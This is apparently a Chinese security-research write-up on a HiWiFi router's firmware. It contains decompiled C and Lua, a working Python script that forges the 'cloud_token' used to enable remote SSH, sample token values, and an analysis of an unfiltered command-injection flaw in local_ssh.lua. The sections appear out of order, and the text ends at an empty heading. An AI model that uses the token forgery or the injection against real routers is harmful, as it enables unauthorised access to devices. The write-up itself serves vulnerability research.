
```c++
int hmac_sha1_with_uuid(int a1, int a2, int a3, ...)
{
int n20; // $v0
int v7; // $v0
int v8; // $v0
_BYTE v9[40]; // [sp+28h] [-40h] BYREF
_DWORD v10[5]; // [sp+50h] [-18h] BYREF
char v11; // [sp+64h] [-4h]
int *va; // [sp+8Ch] [+24h] BYREF
va_list va_1; // [sp+8Ch] [+24h]
va_list va1; // [sp+90h] [+28h] BYREF
va_start(va1, a3);
va_start(va_1, a3);
va = va_arg(va1, int *);
memset(v10, 0, sizeof(v10));
v11 = 0;
memset(v9, 0, 38);
if ( !a1 )
return -1;
n20 = -1;
if ( a2 > 0 && a3 )
{
if ( (int)va >= 20 )
{
tw_get_uuid(v9);
v9[37] = 0;
v7 = strlen(v9);
if ( !v7 )
return -2;
if ( !SHA1(v9, v7, v10) )
return -3;
v8 = EVP_sha1();
if ( !v8 )
return -4;
if ( !HMAC(v8, v10, 20, a1, a2, a3, va_1) )
return -5;
n20 = 20;
if ( va != &dword_14 )
return -5;
return n20;
}
return -1;
}
return n20;
}
```

`tw_get_uuid(v9)`是获取固件信息的`fac_uuid`，也就是固件的`uuid`。在`libtw.so.0.1.0`中，代码如下:

```c++
char *__fastcall tw_get_uuid(char *_00000000_0000_0000_0000_d4ee07000000)
{
_BYTE v3[140]; // [sp+18h] [-8Ch] BYREF
if ( !_00000000_0000_0000_0000_d4ee07000000 )
_assert("uuid != ((void *)0)", "libtw.c", 150, "tw_get_uuid");
memset(_00000000_0000_0000_0000_d4ee07000000, 0, 32);
memset(v3, 0, 129);
if ( bdinfo_get_value((int)"fac_uuid", (int)v3) )
strcpy(_00000000_0000_0000_0000_d4ee07000000, "00000000-0000-0000-0000-d4ee07000000");
else
strncpy(_00000000_0000_0000_0000_d4ee07000000, v3, 37);
return _00000000_0000_0000_0000_d4ee07000000;
}
```

然后调用`SHA1`对`uuid`进行哈希运算做为`HMAC`的密钥，`HMAC`使用的是`sha1`模式进行哈希运算。

根据以上的分析结果生成计算`cloud_token`的python代码如下:

```python
import base64
import hashlib
import hmac
import sys

def main(uuid, local_token):
    # uuid = 'f1f01c50-a881-11e4-9b37-d4ee0722421e'
    uuid_sha1 = hashlib.sha1(uuid.encode()).digest()
    # local_token = 'RDRFRTA3MjI0MjFFLHNzaCwxNjEyNTA5ODU1NTI4LN/Gtg9ilqUoIsFFNGeHCHIA237Q'
    base64_token = base64.b64decode(local_token)
    mac_address,ssh,current_time,hmac_token = base64_token.decode("latin1").split(",")
    local_info = f"{mac_address},{ssh},{int(current_time)+1}".encode("latin1")
    cloud_token = hmac.new(uuid_sha1, local_info, hashlib.sha1).digest()
    cloud_token_b64 = base64.b64encode(cloud_token).decode("latin1")
    # 5Jj4IhbY/K+QpS3n1rGfMFI3A58=
    print("cloud_token:" + cloud_token_b64)

if __name__ == "__main__":
    total_args = len(sys.argv)
    if total_args != 3:
        print("Usage: python3 cloud_token.py uuid local_token")
        sys.exit(1)
    uuid = sys.argv[1]
    local_token = sys.argv[2]
    main(uuid, local_token)
```

## 漏洞分析

远程命令执行的漏洞分析比较简单，漏洞代码就位于以上的`local_ssh.lua`中。漏洞代码如下:

```
local cmd_result = utils.exec_cmd("sudo /usr/lib/lua/luci/local_ssh/local_ssh_util.lua valid " .. tostring(request.data))
```

在`method=valid`时，对于传来的`data`参数没有做任何的过滤就直接传进了`exec_cmd`进行了执行。

远程命令执行的POC代码如下: <mark class="encrypted">083K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5J5y4#2)9J5k6e0m8Q4x3X3f1H3i4K6u0W2x3g2)9J5c8X3I4G2j5$3q4D9i4K6u0V1M7%4y4Z5i4K6u0r3L8h3g2@1K9r3!0V1i4K6y4p5N6X3q4D9K9h3c8Q4x3U0k6V1j5i4c8S2i4K6y4p5i4K6N6o6L8s2x3`.</mark>

![POC页面](upload/attach/202510/920134_R3N9NZ8RPMFFRAK.webp)

## 简介

本篇主要介绍`cloud_token`的计算方式和远程命令执行漏洞的代码分析。`cloud_token`是开启远程ssh的token，如果知道`cloud_token`就可以远程开启ssh服务。

## `cloud_token`计算

按照上文的模拟环境运行方式，打开`faeK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5J5y4#2)9J5k6e0m8Q4x3X3f1H3i4K6u0W2x3g2)9J5c8X3I4G2j5$3q4D9i4K6u0V1M7%4y4Z5i4K6u0r3`连接。出现远程开启ssh服务的页面。

![SSH页面](https://bbs.kanxue.com/upload/attach/202510/920134_7VXUW6AFAEJSRZS.webp)

正常情况下local token的输入框显示的是路由器local token的值，因为是模拟环境，没有板载信息，所以显示的为空。这里提供一组历史数据:

- `local_token`：`RDRFRTA3MjI0MjFFLHNzaCwxNjEyNTA5ODU1NTI4LN/Gtg9ilqUoIsFFNGeHCHIA237Q`
- `uuid`：`f1f01c50-a881-11e4-9b37-d4ee0722421e`
- `cloud_token`：`5Jj4IhbY/K+QpS3n1rGfMFI3A58=`

`uuid`就是路由器的固件信息，每个路由器都不同，获取的路径是`8dfK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5J5y4#2)9J5k6e0m8Q4x3X3f1H3i4K6u0W2x3g2)9J5c8X3y4Y4K9g2)9J5k6r3u0A6L8W2)9J5c8Y4c8#2M7X3u0G2i4K6u0r3M7s2u0G2P5s2W2Q4x3V1k6J5L8%4g2@1k6i4u0Q4y4h3k6A6L8X3k6G2`

通过查看`nginx`的配置文件，可以找到`local_ssh`的解析路径为`/usr/lib/lua/luci/local_ssh/local_ssh.lua`;

然后使用`luadec`对`local_ssh.lua`和`local_ssh_util.lua`进行反编译，`luadec`需要使用`luadec-openwrt`的版本。

可以使用`luadec`直接反编译，也可以使用`luadec -dis`先转为lua的反汇编形式，再使用AI转为lua代码；

`local_ssh.lua`的反编译代码如下:

```lua
local json = require("hiwifi.json")
local utils = require("openapi.utils.utils")
local string = string
local tostring = tostring

module("luci.local_ssh.local_ssh")

local function dispatcher(request)
    local response = ""
    local result = {}

    if not request then
        request = {}
    end

    local method = request.method

    if method == "get" then
        local cmd_result = utils.exec_cmd("sudo /usr/lib/lua/luci/local_ssh/local_ssh_util.lua get")
        result["code"] = 0
        result["data"] = cmd_result
    elseif method == "valid" then
        if request.data ~= nil then
            local cmd_result = utils.exec_cmd("sudo /usr/lib/lua/luci/local_ssh/local_ssh_util.lua valid " .. tostring(request.data))
            if not cmd_result then
                cmd_result = ""
            end
            cmd_result = tostring(cmd_result)

            if string.find(cmd_result, "Success:") then
                result["code"] = 0
                result["data"] = cmd_result
            else
                result["code"] = 1
                result["data"] = cmd_result
            end
        else
            -- 当request.data为nil时的处理
            result["code"] = 1
            result["data"] = ""
        end
    elseif method == "stop" then
        local cmd_result = utils.exec_cmd("sudo /usr/lib/lua/luci/local_ssh/local_ssh_util.lua stop")
        result["code"] = 0
        result["data"] = cmd_result
    else
        result["code"] = 1
        result["data"] = "Error: Method does not exist"
    end

    response = json.encode(result)
    return response
end

dispatcher = dispatcher
```

`local_ssh_util.lua`的反编译代码如下:
